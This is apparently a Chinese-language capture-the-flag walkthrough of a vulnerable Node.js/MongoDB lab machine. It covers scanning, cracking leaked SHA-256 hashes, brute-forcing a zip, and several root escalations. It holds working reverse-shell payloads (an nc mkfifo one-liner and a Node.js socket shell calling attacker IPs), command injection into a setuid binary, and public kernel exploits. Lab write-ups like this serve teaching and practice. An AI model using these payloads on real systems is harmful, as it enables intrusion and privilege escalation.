# mynew
静态源码发现调用了javascript目录和js文件在前端
fcrackzip -u -D -p /root/Desktop/rockyou.txt dayu .zip类型的文件继续爆破！
2）Mongodb提权 
js木马： 
二进制文件传输到本地：
base64 -d /usr/local/bin/backup
vi base64.txt
cat base64.txt | base64 -d > backup

les枚举
# 

VMware双击打开nat模式即可！

1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for 192.168.253.176

2、nmap 192.168.253.176 -p- -A
22/tcp   open  ssh    OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
3000/tcp open  hadoop-datanode Apache Hadoop


3、web信息枚举

http://192.168.253.176:3000/
访问进去右上角有ligon登录模块点击：
http://192.168.253.176:3000/login

<script type="text/javascript" src="vendor/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="vendor/angular/angular.min.js"></script>
	<script type="text/javascript" src="vendor/angular/angular-route.min.js"></script>
	<script type="text/javascript" src="assets/js/app/app.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/home.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/login.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/admin.js"></script>
	<script type="text/javascript" src="assets/js/app/controllers/profile.js"></script>
	<script type="text/javascript" src="assets/js/misc/freelancer.min.js"></script>

查看静态源码发现调用了javascript目录和js文件在前端！


在查看view-source:http://192.168.253.176:3000/assets/js/app/controllers/home.js
静态源码发现调用了：/api/users/

访问：
http://192.168.253.176:3000/api/users/
发现这是前端的JSON！包含四个用户名密码信息：
myP14ceAdm1nAcc0uNT
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af

tom
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240

mark
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73

rastating
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0

hash-identifier枚举发现：
Possible Hashs:
[+] SHA-256
[+] Haval-256
这是256的密码值！


4、hash破解

https://crackstation.net/

-----------------------------
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af	sha256	manchester
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240	sha256	spongebob
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73	sha256	snowflake
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0	Unknown	Not found.


-----------------------------

获得三个正确密码信息：
myP14ceAdm1nAcc0uNT
manchester

tom
spongebob

mark
snowflake

-----------------------------
tom和mark都是普通用户，访问http://192.168.253.176:3000/login
myP14ceAdm1nAcc0uNT
manchester
登录进去下载了文件：myplace.backup



5、解码

cat myplace.backup | base64 -d > dayu
file dayu                            
dayu: Zip archive data, at least v1.0 to extract

zip类型的文件继续爆破！

6、zip爆破

mv dayu dayu.zip
fcrackzip -u -D -p /root/Desktop/rockyou.txt dayu.zip
-D	指定方式为字典猜解
-p	指定猜解字典的路径
-u	表示只显示破解出来的密码，其他错误的密码不显示出


PASSWORD FOUND!!!!: pw == magicword
成功获得密码！

unzip dayu.zip
magicword


7、源码审计

https://www.runoob.com/nodejs/nodejs-mongodb.html

发现这是www站目录源码信息泄露，存在app.js！

App.js 是一个轻量级的 JavaScript UI 库，用来创建移动的 Web 应用，应用的外观跟原生的应用相同，性能也近乎一致。

---------------------
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';

---------------------
获取到了mongodb信息！！


8、内部信息枚举

ssh mark@192.168.253.176
5AYRft73VtFpc84k
成功登录！！

python -m SimpleHTTPServer 8081
wget http://192.168.253.138:8081/linpeas.sh
chmod +x linpeas.sh

1）Linux version 4.4.0-93-generic
2）Sudo version 1.8.16
3）mongodb   1288  0.6 11.6 281956 88380
127.0.0.1:27017
4）uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1002(admin)


9、提权

1）内核提权

searchsploit Linux 4.4.0
Linux Kernel < 4.4.0-116
locate linux/local/44298.c
cp /usr/share/exploitdb/exploits/linux/local/44298.c .

python -m SimpleHTTPServer 8081
wget http://192.168.253.138:8081/44298.c
gcc 44298.c -o dayu
chmod +x dayu
./dayu


2）Mongodb提权

https://www.runoob.com/mongodb/mongodb-connections.html

ps aux | grep -v root
-v  ---查看不匹配的行

tom       1281  0.0  5.6 1023720 42868 ?       Ssl  02:57   0:01 /usr/bin/node /var/www/myplace/app.js

看到/var/scheduler/app.js的tom用户下运行的调度程序应用程序


nc -vlp 4444

mongo -u mark -p 5AYRft73VtFpc84k scheduler   ---db 查看库信息
show collections       ----show tables;查看已存在的表
db.tasks.find({})     ----查看一下表内容,现在表中无文档
db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.139.149 4444 >/tmp/f"})   ----将反弹shell插入文档

成功获得tom用户的反弹shell!

python3 -c 'import pty; pty.spawn("/bin/bash")'

------------------------------------
3）方法3-app.js提权
里还有别的方法在JavaScript中创建一个反向shell

js木马：
----
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(1234, "192.168.139.131", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();

----
nc -vlp 1234

mongo -u mark -p 5AYRft73VtFpc84k scheduler
show collections
db.tasks.findOne()
db.tasks.insert({"cmd": "/usr/bin/node /tmp/shell.js"})

成功获得反弹shell！


------------------------------------
4）提权方法4：命令注入


find / -perm -4000 2>/dev/null
/usr/local/bin/backup
cd /usr/local/bin/
-rwsr-xr--  1 root admin 16484 Sep  3  2017 backup

/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root/
目录这边可以用/etc/或者/root/，使用这两个目录才会产生base64字符串!
该字符串可以按照与之前的myplace.backup文件完全相同的方式进行解码和解压缩!


文件传输到本地：
base64 -d /usr/local/bin/backup
vi base64.txt
cat base64.txt | base64 -d > backup

-------
/root
/etc
/tmp/.backup_%i
/usr/bin/zip -r -P magicword %s %s > /dev/null    -----需要绕过/dev/null重定向
/usr/bin/base64 -w0 %s
The target path doesn't exist

-------
1. 它检查有效的访问令牌
2. 对于位置/root和/etc，它具有硬编码的base64输出
3. 如果位置不是/etc或/root，它将在/tmp文件夹中创建一个临时文件
4. 然后使用以下命令压缩到特定位置。/usr/bin/zip -r -P magicword %s %s > /dev/null

可以从该命令的输出推断出，如果directory参数是/root或/etc，则返回上面的硬编码base64长字符串，否则，二进制文件将运行/usr/bin/zip -r -P magicword %s %s > /dev/null！！！
5. 然后将存档文件进行 base64 编码并打印到终端上！


需要将字符串作为第三个参数传递给二进制可执行文件，该二进制可执行文件带有多个\n字符，以打印新行，然后当/bin/bash执行时，我们将具有root访问权限，因为二进制文件以root身份运行，添加了最终命令，使bash会话的输出不会重定向到/dev/null即可（使用换行符绕过 /dev/null)


/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo '\n/bin/bash\')"


/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo '/any ； /bin/bash any')"



注意：此命令在前面看到的python代码段创建的伪终端内不起作用的，必须首先通过在psuedo-terminal内键入exit或通过以用户tom身份重新连接而完全不运行python代码段来留下该伪终端，才可以执行成功！！

------------------------------------

5）les枚举-CVE-2017-16995

漏洞编号：CVE-2017-16995

漏洞详情：
该漏洞由Google project zero发现。该漏洞存在于带有 eBPF bpf(2)系统（CONFIG_BPF_SYSCALL）编译支持的Linux内核中，是一个内存任意读写漏洞。该漏洞是由eBPF验证模块的计算错误产生的。普通用户可以构造特殊的BPF来触发该漏洞，此外恶意攻击者也可以使用该漏洞来进行本地提权操作。

locate 45010
cp /usr/share/exploitdb/exploits/linux/local/45010.c .
gcc 45010.c -o cve-2017-16995

上传执行成功！获得root权限！！


拓展小知识：

mongo -p -u mark scheduler
db.adminCommand( { "hostInfo" : 1 } )
db.version()

show dbs
show collections
db.tasks
db.tasks.insert({"cmd":"cp /bin/bash /tmp/bash;chmod +xs /tmp/bash;"})
exit;
./bash -p


/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /ro*t/ro*t.txt
echo "编码信息放入" > dayu-root
base64 -d dayu-root > root-backup.zip
unzip root-backup.zip
cat root/root.txt





















































































